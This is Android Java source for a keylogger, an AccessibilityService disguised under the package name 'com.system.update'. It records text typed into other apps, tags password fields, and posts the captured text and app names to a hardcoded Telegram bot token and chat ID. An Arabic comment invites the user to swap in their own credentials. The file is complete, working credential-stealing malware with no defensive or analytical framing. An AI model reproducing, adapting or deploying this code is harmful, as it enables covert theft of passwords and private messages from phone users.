package com.system.update;

import android.accessibilityservice.AccessibilityService;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.IOException;
import okhttp3.*;

public class KeyloggerService extends AccessibilityService {
    // ⚠️ غير البيانات هنا
    private static final String BOT_TOKEN = "9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
    private static final String CHAT_ID = "6978974735";
    private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";

    private final OkHttpClient client = new OkHttpClient();
    
    private String lastText = "";
    private String lastPkg = "";
    private Handler handler = new Handler(Looper.getMainLooper());
    private Runnable sendRunnable;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                String text = source.getText().toString();
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";

                if (text.trim().isEmpty() || text.equals(lastText)) return;
                
                lastText = text;
                lastPkg = pkg;

                if (pkg.equals("com.system.update")) return;

                if (sendRunnable != null) handler.removeCallbacks(sendRunnable);

                sendRunnable = () -> {
                    String type = source.isPassword() ? "🔐 **باسورد:**" : "⌨️ **نص:**";
                    sendTextToTelegram(type + "\n**التطبيق:** `" + lastPkg + "`\n**النص:** `" + lastText + "`");
                };
                handler.postDelayed(sendRunnable, 2000);
            }
        }
    }

    @Override public void onInterrupt() {}
    
    private void sendTextToTelegram(String text) {
        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build();
        Request request = new Request.Builder().url(TG_API + "sendMessage").post(body).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) { }
            @Override public void onResponse(Call call, Response response) { }
        });
    }
}
